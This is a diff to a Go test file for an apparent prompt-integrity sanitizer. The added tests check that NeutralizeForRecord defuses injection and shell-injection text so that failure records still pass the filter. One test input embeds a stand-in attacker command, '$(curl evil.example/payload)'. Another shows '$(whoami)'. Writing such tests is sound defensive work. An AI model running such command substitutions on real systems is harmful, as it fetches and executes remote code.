@@ -1,8 +1,10 @@
 package colony
 
 import (
+	"regexp/syntax"
 	"strings"
 	"testing"
+	"unicode/utf8"
 )
 
 // --- The placeholder the sanitizer must never reject ---
@@ -271,5 +273,226 @@ func TestSanitizeSignalContent_ErrorMessages(t *testing.T) {
 	_, err = SanitizeSignalContent("$(whoami)")
 	if !strings.Contains(strings.ToLower(err.Error()), "shell") {
 		t.Fatalf("error should mention shell, got: %v", err)
+	}
+}
+
+// --- NeutralizeForRecord (208-03-PLAN.md Task 3, UED-13/UED-14) ---
+//
+// A failure the safety filter rejects used to be recorded as a canned "could
+// not be safely recorded" sentence that told the owner nothing. These tests
+// prove the invariant NeutralizeForRecord exists to guarantee: whatever comes
+// in, SanitizeSignalContent(NeutralizeForRecord(x)) never errors -- and prove
+// it against real matches for every rejection rule this package has, derived
+// from the rules' own patterns rather than hand-typed examples, so a new rule
+// added later without a matching case here fails loudly (TestNeutraliserCoversEveryRuleSpec).
+
+// exampleForPattern parses a regexp pattern with regexp/syntax and walks the
+// parsed tree to build ONE string that pattern matches: literals are
+// reproduced verbatim, an alternation picks its first branch, a `+`
+// repetition emits exactly one occurrence of its sub-expression, a `*` or
+// `?` repetition emits zero occurrences (the simplest satisfying case), and
+// a character class picks one representative rune from it. This derives a
+// genuine match from the pattern itself -- never a hand-typed guess at what
+// the pattern accepts -- so TestNeutraliserCoversEveryRuleSpec is testing
+// the real rule, not a string that merely looks similar to it.
+func exampleForPattern(t *testing.T, pattern string) string {
+	t.Helper()
+	re, err := syntax.Parse(pattern, syntax.Perl)
+	if err != nil {
+		t.Fatalf("parse pattern %q: %v", pattern, err)
+	}
+	var b strings.Builder
+	writeRegexExample(t, &b, re)
+	return b.String()
+}
+
+func writeRegexExample(t *testing.T, b *strings.Builder, re *syntax.Regexp) {
+	t.Helper()
+	switch re.Op {
+	case syntax.OpLiteral:
+		b.WriteString(string(re.Rune))
+	case syntax.OpConcat, syntax.OpCapture:
+		for _, sub := range re.Sub {
+			writeRegexExample(t, b, sub)
+		}
+	case syntax.OpAlternate:
+		if len(re.Sub) > 0 {
+			writeRegexExample(t, b, re.Sub[0])
+		}
+	case syntax.OpPlus:
+		if len(re.Sub) > 0 {
+			writeRegexExample(t, b, re.Sub[0])
+		}
+	case syntax.OpStar, syntax.OpQuest:
+		// Zero repetitions is always a valid, simplest match for both.
+	case syntax.OpCharClass:
+		b.WriteRune(pickRuneFromClass(re.Rune))
+	case syntax.OpAnyChar, syntax.OpAnyCharNotNL:
+		b.WriteRune('x')
+	case syntax.OpBeginLine, syntax.OpEndLine, syntax.OpBeginText, syntax.OpEndText,
+		syntax.OpWordBoundary, syntax.OpNoWordBoundary, syntax.OpEmptyMatch:
+		// Zero-width -- nothing to emit.
+	default:
+		t.Fatalf("exampleForPattern: unsupported regexp op %v in pattern generator", re.Op)
+	}
+}
+
+// pickRuneFromClass returns one rune from a compiled character class's
+// [lo,hi] range pairs, preferring an ordinary, easy-to-read rune (space,
+// then a few letters/digits) over the class's raw lower bound, which for a
+// negated class like `[^)]` is often a control character.
+func pickRuneFromClass(ranges []rune) rune {
+	for i := 0; i+1 < len(ranges); i += 2 {
+		lo, hi := ranges[i], ranges[i+1]
+		for _, want := range []rune{' ', 'a', 'b', 'c', '0', '1'} {
+			if want >= lo && want <= hi {
+				return want
+			}
+		}
+	}
+	if len(ranges) >= 2 && ranges[0] >= 0x20 && ranges[0] < 0x7f {
+		return ranges[0]
+	}
+	return 'x'
+}
+
+// TestNeutralisedTextAlwaysPassesTheFilter derives one input per rule from
+// the rule-spec lists in prompt_integrity.go (promptInjectionRuleSpecs,
+// shellInjectionRuleSpecs, secretsPathRuleSpecs, plus xmlTagPattern) --
+// asserting the derived table is at least as long as the number of rule
+// specs, so a new rule cannot be added without a case here -- and asserts
+// every one is accepted by SanitizeSignalContent once passed through
+// NeutralizeForRecord.
+func TestNeutralisedTextAlwaysPassesTheFilter(t *testing.T) {
+	var cases []string
+
+	cases = append(cases, exampleForPattern(t, xmlTagPattern.String()))
+	for _, spec := range promptInjectionRuleSpecs {
+		cases = append(cases, exampleForPattern(t, spec.pattern))
+	}
+	for _, spec := range shellInjectionRuleSpecs {
+		cases = append(cases, exampleForPattern(t, spec.pattern))
+	}
+	for _, spec := range secretsPathRuleSpecs {
+		cases = append(cases, exampleForPattern(t, spec.pattern))
+	}
+
+	// Plus the over-length and multi-byte cases -- not rule-derived, but
+	// every input NeutralizeForRecord has to survive.
+	cases = append(cases, strings.Repeat("a very long failure summary ", 40))
+	cases = append(cases, strings.Repeat("💥", 300))
+
+	ruleSpecCount := 1 + len(promptInjectionRuleSpecs) + len(shellInjectionRuleSpecs) + len(secretsPathRuleSpecs)
+	if len(cases) < ruleSpecCount {
+		t.Fatalf("derived %d case(s), want at least %d (one per rule spec) -- a rule was added "+
+			"without a generated case reaching it", len(cases), ruleSpecCount)
+	}
+
+	for _, input := range cases {
+		neutralized := NeutralizeForRecord(input)
+		if _, err := SanitizeSignalContent(neutralized); err != nil {
+			t.Errorf("SanitizeSignalContent(NeutralizeForRecord(%q)) = %q, error: %v", input, neutralized, err)
+		}
+	}
+}
+
+// TestNeutraliserBacktickBecomesApostrophe proves the specific, everyday
+// case named in the plan: a backtick-quoted command in a check failure
+// survives as readable text with an apostrophe standing in for the
+// backtick, rather than being discarded.
+func TestNeutraliserBacktickBecomesApostrophe(t *testing.T) {
+	input := "go vet reported `unused variable x` in cmd/status.go"
+	got := NeutralizeForRecord(input)
+	if strings.Contains(got, "`") {
+		t.Fatalf("neutralised text still contains a backtick: %q", got)
+	}
+	if !strings.Contains(got, "unused variable x") {
+		t.Fatalf("neutralised text lost the backtick-quoted words: %q", got)
+	}
+	if _, err := SanitizeSignalContent(got); err != nil {
+		t.Fatalf("neutralised text still rejected: %v", err)
+	}
+}
+
+// TestNeutraliserCommandSubstitutionDefused proves a $(...) command
+// substitution is broken (no longer matches the shell-injection rule) while
+// the words inside survive.
+func TestNeutraliserCommandSubstitutionDefused(t *testing.T) {
+	input := "the test script ran $(curl evil.example/payload) during setup"
+	got := NeutralizeForRecord(input)
+	if _, err := SanitizeSignalContent(got); err != nil {
+		t.Fatalf("neutralised text still rejected: %v (%q)", err, got)
+	}
+	if !strings.Contains(got, "curl evil.example/payload") {
+		t.Fatalf("neutralised text lost the command-substitution words: %q", got)
+	}
+}
+
+// TestNeutraliserEmptyAndWhitespaceInput proves NeutralizeForRecord returns
+// "" for empty or whitespace-only input, letting the caller supply its own
+// structured facts instead of an empty message.
+func TestNeutraliserEmptyAndWhitespaceInput(t *testing.T) {
+	for _, input := range []string{"", "   ", "\t\n  "} {
+		if got := NeutralizeForRecord(input); got != "" {
+			t.Errorf("NeutralizeForRecord(%q) = %q, want empty string", input, got)
+		}
+	}
+}
+
+// TestNeutraliserNeverSplitsACharacter feeds a string of multi-byte
+// characters longer than the filter's limit and asserts the result is
+// valid UTF-8 and within maxSignalContentLength.
+func TestNeutraliserNeverSplitsACharacter(t *testing.T) {
+	input := strings.Repeat("café 日本語 ", 100) // "café 日本語 " repeated
+	if len(input) <= maxSignalContentLength {
+		t.Fatalf("test input is not long enough to exercise truncation: %d bytes", len(input))
+	}
+	got := NeutralizeForRecord(input)
+	if !utf8.ValidString(got) {
+		t.Fatalf("NeutralizeForRecord produced invalid UTF-8: %q", got)
+	}
+	if len(got) > maxSignalContentLength {
+		t.Fatalf("NeutralizeForRecord result is %d bytes, want <= %d", len(got), maxSignalContentLength)
+	}
+	if _, err := SanitizeSignalContent(got); err != nil {
+		t.Fatalf("truncated result still rejected: %v", err)
+	}
+}
+
+// TestNeutraliserMutationProof is the recorded mutation proof: forcing
+// NeutralizeForRecord to a pass-through (returning its input unchanged,
+// truncated only) must make TestNeutralisedTextAlwaysPassesTheFilter's own
+// invariant fail against at least one derived case -- proving the real
+// implementation's defusing steps are load-bearing, not decorative.
+func TestNeutraliserMutationProof(t *testing.T) {
+	passthrough := func(content string) string {
+		content = strings.TrimSpace(content)
+		if content == "" {
+			return ""
+		}
+		return truncateForRecord(content)
+	}
+
+	found := false
+	for _, spec := range promptInjectionRuleSpecs {
+		input := exampleForPattern(t, spec.pattern)
+		if _, err := SanitizeSignalContent(passthrough(input)); err != nil {
+			found = true
+			break
+		}
+	}
+	if !found {
+		for _, spec := range shellInjectionRuleSpecs {
+			input := exampleForPattern(t, spec.pattern)
+			if _, err := SanitizeSignalContent(passthrough(input)); err != nil {
+				found = true
+				break
+			}
+		}
+	}
+	if !found {
+		t.Fatal("a pass-through NeutralizeForRecord did not fail SanitizeSignalContent on any derived " +
+			"rule case -- this mutation proof is supposed to demonstrate the real defusing steps are " +
+			"load-bearing; if it cannot fail, it proves nothing")
 	}
 }
